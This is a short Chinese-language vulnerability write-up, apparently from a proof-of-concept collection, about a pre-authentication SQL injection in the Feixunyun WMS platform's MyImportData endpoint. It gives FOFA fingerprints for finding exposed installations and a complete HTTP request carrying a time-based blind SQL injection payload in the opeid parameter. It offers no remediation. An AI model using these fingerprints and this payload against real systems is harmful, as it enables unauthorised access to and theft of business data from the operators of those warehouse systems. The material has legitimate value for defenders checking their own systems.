# 飞讯云供应链平台MyImportData 前台SQL注入

# ke一、漏洞简介
WMS系统是借助条码、移动设备、互联网等技术实现仓库收、发、存等作业流程的自动化、和数字化的信息管理系统，旨在帮助客户解决库存分类管理和实时监控、仓库延迟录入和账务不符、仓储作业效率和作业合规、物料批次管理和库存库龄预警等问题，实现降低内部存货风险，提高企业的资金流转，促进产、销、供与财务端间的有效协同和提升仓库库容率和仓储运作效率的目标。 飞讯云WMS系统存在SQL注入，成功利用该漏洞可获取敏感信息，造成远程代码执行。

# 二、影响版本
+ 飞讯云WMS

# 三、资产测绘
+ fofa`icon_hash="-2088130336"``body="wx8ccb75857bd3e985"`
+ 特征

![1721892431875-70ae1713-fa25-4875-b9f0-de4a891b31f2.png](./img/ZJLY5lae1UPP7ur9/1721892431875-70ae1713-fa25-4875-b9f0-de4a891b31f2-603050.png)

# 四、漏洞复现
```plain
GET /MyDown/MyImportData?opeid=%27+WAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: JSESSIONID=83a23f73-2908-4424-abd9-6b044cdfe003; Language=zh-CN
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```

![1721892461788-574ec73d-01c4-4aea-b83a-ca51a265c5a1.png](./img/ZJLY5lae1UPP7ur9/1721892461788-574ec73d-01c4-4aea-b83a-ca51a265c5a1-340837.png)



> 更新: 2024-08-12 17:15:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rldp6r4s4n2hly4z>